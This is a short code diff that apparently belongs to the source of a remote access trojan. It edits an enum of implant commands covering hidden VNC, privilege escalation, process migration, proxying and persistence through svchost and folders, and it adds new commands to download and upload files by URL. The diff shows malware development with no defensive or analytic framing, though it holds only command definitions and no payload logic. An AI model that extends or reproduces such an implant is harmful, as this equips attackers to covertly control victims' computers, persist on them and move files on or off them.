@@ -18,19 +18,21 @@ enum Opcodes{
     VNC, //2//vnc [ip] [port]
     HVNC, //2//hvnc [ip] [port]
     CRITICAL, //1//critical [true/false]
-    ENUMDESKTOPS, //0
+    ENUMDESKTOPS, //r0
     SETWINSTA, //1//setwinsta [station]
     SETTHDDSK, //1//setthddsk [desktop]
-    GETTHDDSK, //0
+    GETTHDDSK, //r0
     PUSHINT, //0
     PUSHSTR, //0
     PROXY, //2//proxy [ip] [port]
     KILLPROXY, //1//killproxy [id]
     MIGRATE, //1//migrate [pid]
-    PS, //0//list processes
-    GETPID, //0
-    CHECKADMIN, //0
+    PS, //r0//list processes
+    GETPID, //r0
+    CHECKADMIN, //r0
     PRIVESC, //0
     SVCHOST_PERSIST, //0
     FOLDER_PERSIST, //0
+    DL_FILE, //2//dl_file [url] [path]
+    UL_FILE, //2//ul_file [url] [path]
 };
